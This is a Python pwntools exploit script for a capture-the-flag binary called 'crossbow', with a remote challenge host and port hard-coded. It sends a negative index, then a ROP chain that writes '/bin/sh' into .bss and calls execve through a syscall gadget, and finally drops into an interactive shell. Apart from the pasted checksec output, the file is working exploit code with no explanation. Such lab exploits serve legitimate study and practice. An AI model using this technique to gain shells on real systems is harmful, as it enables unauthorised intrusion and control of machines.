#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './crossbow'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '94.237.60.64', 32076

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x401321

break *0x40136d
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec crossbow 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)


def exploit():
    global io
    io = initialize()

    io.sendlineafter(b':', b'-2')
    
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
    write_gadget = 0x00000000004020f5 # mov qword ptr [rdi], rax ; ret
    syscall = rop.find_gadget(['syscall', 'ret'])[0]

    payload = flat({
        0x8: [
            pop_rax,
            u64(b'/bin/sh\x00'),
            pop_rdi,
            elf.bss()+0x100,
            write_gadget,
            pop_rax,
            0x3b,
            pop_rdx,
            0x0,
            pop_rsi,
            0x0,
            syscall
        ]
    })
    io.sendline(payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()
